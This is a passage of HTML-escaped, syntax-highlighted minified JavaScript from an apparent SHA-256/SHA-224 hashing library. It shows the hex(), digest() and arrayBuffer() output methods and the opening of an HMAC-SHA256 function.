class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">hex&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0x0F&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">hex&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toString&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hex&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">digest&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">h0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">arr&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">arr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mh">0xFF&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">arr&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">array&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">digest&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">arrayBuffer&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">buffer&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">dataView&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">DataView&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buffer&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">dataView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setUint32&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">buffer&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">HmacSha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span 